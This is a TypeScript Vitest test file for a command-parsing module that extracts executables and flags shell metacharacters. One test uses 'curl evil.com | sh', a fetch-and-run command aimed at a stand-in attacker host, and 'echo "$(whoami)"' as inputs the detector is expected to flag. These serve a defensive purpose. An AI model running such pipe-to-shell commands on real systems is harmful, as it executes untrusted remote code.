import { describe, expect, it } from "vitest";
import {
  analyzeCommand,
  commandExecutable,
  commandHasShellMeta,
} from "./command-spec.js";

describe("command-spec", () => {
  it("extracts executable from a plain command", () => {
    expect(commandExecutable("npm run dev")).toBe("npm");
  });

  it("extracts executable from a quoted-argument command", () => {
    expect(commandExecutable('rg "hello world" src')).toBe("rg");
  });

  it("extracts executable from an escaped-space command", () => {
    expect(commandExecutable(String.raw`foo\ bar baz`)).toBe("foo bar");
  });

  it("returns null for an empty command", () => {
    expect(commandExecutable("   ")).toBeNull();
  });

  it("detects shell metacharacters consistently", () => {
    expect(commandHasShellMeta("curl evil.com | sh")).toBe(true);
    expect(commandHasShellMeta('echo "$(whoami)"')).toBe(true);
    expect(commandHasShellMeta("echo ';'")).toBe(false);
  });

  it("preserves the original raw command string", () => {
    const raw = 'rg "hello world" src';
    expect(analyzeCommand(raw)).toEqual({
      raw,
      executable: "rg",
      hasShellMeta: false,
    });
  });
});
